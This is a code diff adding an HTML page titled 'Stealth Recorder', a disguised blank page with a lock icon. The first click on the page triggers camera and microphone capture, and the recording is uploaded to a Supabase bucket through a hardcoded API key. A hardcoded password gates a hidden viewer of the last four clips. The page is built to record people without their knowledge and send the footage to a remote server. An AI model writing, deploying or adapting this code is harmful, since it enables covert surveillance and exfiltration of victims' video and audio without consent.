@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Stealth Recorder + Last 4 Videos</title>
+  <script src="https://unpkg.com/@supabase/supabase-js@2.39.5/dist/umd/supabase.js"></script>
+  <style>
+    body {
+      margin: 0;
+      background: white;
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      font-family: sans-serif;
+      text-align: center;
+    }
+    #lockIcon {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      font-size: 30px;
+      z-index: 999;
+      cursor: pointer;
+      user-select: none;
+    }
+    #viewer {
+      display: none;
+      background: black;
+      color: white;
+      height: 100vh;
+      padding: 20px;
+      overflow-y: auto;
+    }
+    video {
+      width: 90%;
+      max-width: 600px;
+      background: #000;
+      margin-top: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      background: red;
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div id="lockIcon" onclick="unlock()">🔒</div>
+
+<div id="viewer">
+  <h3>Recording Playback</h3>
+  <video id="playback" controls></video>
+  <br>
+  <button onclick="stopRecording()">STOP</button>
+  <h3>Last 4 Recordings</h3>
+  <div id="videoList"></div>
+</div>
+
+<script>
+  const PASSWORD = "sardarhamza";
+  const BUCKET = "recordings";
+  const client = supabase.createClient(
+    'https://kelbfujbyjtdeopkhhxm.supabase.co',
+    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtlbGJmdWpieWp0ZGVvcGtoaHhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcyMzc5OTgsImV4cCI6MjA2MjgxMzk5OH0.iB97MRNwVCrhtDQaHrh7Q7ra1x4nVNGhih-Tm_pq31k'
+  );
+
+  let stream, mediaRecorder;
+  let recordedChunks = [];
+  let recordingStarted = false;
+  let stopped = false;
+
+  document.body.addEventListener("click", async (e) => {
+    if (e.target.id === "lockIcon" || recordingStarted) return;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      mediaRecorder = new MediaRecorder(stream);
+      recordedChunks = [];
+
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) recordedChunks.push(e.data);
+      };
+
+      mediaRecorder.start();
+      recordingStarted = true;
+      console.log("Recording started");
+
+      setTimeout(() => {
+        if (!stopped) stopRecording();
+      }, 60000); // auto-stop after 60s
+
+    } catch (err) {
+      alert("Camera Error: " + err.message);
+    }
+  });
+
+  async function stopRecording() {
+    if (mediaRecorder && mediaRecorder.state === "recording") {
+      mediaRecorder.stop();
+      stream.getTracks().forEach(t => t.stop());
+      stopped = true;
+
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        const url = URL.createObjectURL(blob);
+        document.getElementById("playback").src = url;
+
+        const fileName = `video_${Date.now()}.webm`;
+
+        // Check existing videos
+        const { data: existing } = await client.storage.from(BUCKET).list('', {
+          sortBy: { column: 'created_at', order: 'asc' }
+        });
+
+        if (existing.length >= 4) {
+          const oldest = existing[0];
+          await client.storage.from(BUCKET).remove([oldest.name]);
+        }
+
+        const { error } = await client.storage.from(BUCKET).upload(fileName, blob);
+        if (!error) alert("Uploaded to Supabase!");
+        loadVideos(); // refresh list
+      };
+    }
+  }
+
+  async function unlock() {
+    const input = prompt("Enter password:");
+    if (input !== PASSWORD) return alert("Wrong password!");
+    document.getElementById("viewer").style.display = "block";
+    loadVideos();
+  }
+
+  async function loadVideos() {
+    const { data, error } = await client.storage.from(BUCKET).list('', {
+      sortBy: { column: 'created_at', order: 'desc' },
+      limit: 4
+    });
+
+    const container = document.getElementById("videoList");
+    container.innerHTML = "";
+
+    if (data && data.length) {
+      for (let file of data) {
+        const { data: urlData } = await client.storage.from(BUCKET).getPublicUrl(file.name);
+        const vid = document.createElement("video");
+        vid.src = urlData.publicUrl;
+        vid.controls = true;
+        container.appendChild(vid);
+      }
+    }
+  }
+</script>
+
+</body>
+</html>
